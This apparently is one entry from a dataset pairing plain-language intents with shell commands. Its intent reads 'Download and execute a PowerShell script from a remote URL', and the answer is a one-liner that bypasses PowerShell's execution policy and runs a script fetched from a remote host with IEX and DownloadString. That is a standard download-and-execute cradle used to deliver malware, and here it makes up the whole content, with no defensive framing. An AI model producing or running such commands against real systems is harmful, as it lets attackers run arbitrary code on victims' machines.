# Natural language intent:
# Download and execute a PowerShell script from a remote URL.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://server.com/Win32.ps1');"
